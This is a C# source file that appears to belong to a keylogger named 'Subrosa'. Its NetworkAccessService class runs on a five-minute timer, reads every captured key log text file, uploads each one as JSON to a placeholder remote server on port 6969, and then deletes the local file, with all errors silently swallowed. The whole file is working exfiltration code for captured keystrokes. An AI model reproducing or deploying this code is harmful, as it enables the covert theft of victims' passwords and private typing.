using Newtonsoft.Json;
using Subrosa.Models;
using System;
using System.ComponentModel;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace Subrosa
{
    public class NetworkAccessService
    {
        private BackgroundWorker _worker;
        private Timer _timer;

        public NetworkAccessService()
        {
            _worker = new BackgroundWorker();
            _worker.DoWork += CheckKeyLogs;
            //_timer = new Timer(43200000); //12 hour delay
            _timer = new Timer(300000);
            _timer.Elapsed += TimerElapsed;
            _timer.Start();
        }

        private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            if (!_worker.IsBusy)
                _worker.RunWorkerAsync();
        }

        private async void CheckKeyLogs(object sender, DoWorkEventArgs e)
        {
            DirectoryInfo d = new DirectoryInfo(Logger.LogPath);
            FileInfo[] files = d.GetFiles("*.txt", SearchOption.AllDirectories); 

            for (int i = 0; i < files.Length; i++)
            {
                try
                {
                    KeyLogModel model = new KeyLogModel();
                    model.Log = File.ReadAllText(files[i].FullName);
                    model.LogTime = DateTime.Now;

                    if (await UploadFile(model))
                        files[i].Delete();
                }
                catch{}
            }
        }

        private async Task<bool> UploadFile(KeyLogModel log)
        {
            string json = JsonConvert.SerializeObject(log);
            HttpClient client = new HttpClient();
            StringContent content = new StringContent(json, Encoding.UTF8, "application/json");
            HttpResponseMessage response = await client.PostAsync("http://www.yoururlhere.com:6969/PostLog", content);

            if (response.StatusCode == HttpStatusCode.OK)
                return true;
            else
                return false;
        }
    }
}
